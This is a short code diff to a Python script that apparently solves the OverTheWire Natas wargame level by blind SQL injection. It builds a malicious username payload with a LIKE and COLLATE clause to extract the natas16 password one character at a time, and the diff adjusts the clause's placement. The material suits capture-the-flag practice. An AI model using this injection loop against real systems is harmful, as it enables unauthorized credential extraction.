@@ -11,7 +11,7 @@ headers = {
     }
 while len(password) != 32:
   for attempt in alphanum: 
-      querystring = {"debug":"yes","username":"natas16\" and COLLATE latin1_general_cs password like \"" + password + attempt + "%"}
+      querystring = {"debug":"yes","username":"natas16\" and password COLLATE latin1_general_cs like \"" + password + attempt + "%"}
       response = requests.request("GET", url, headers=headers, params=querystring)
       c = response.text
       soup = BeautifulSoup(c, "html.parser")
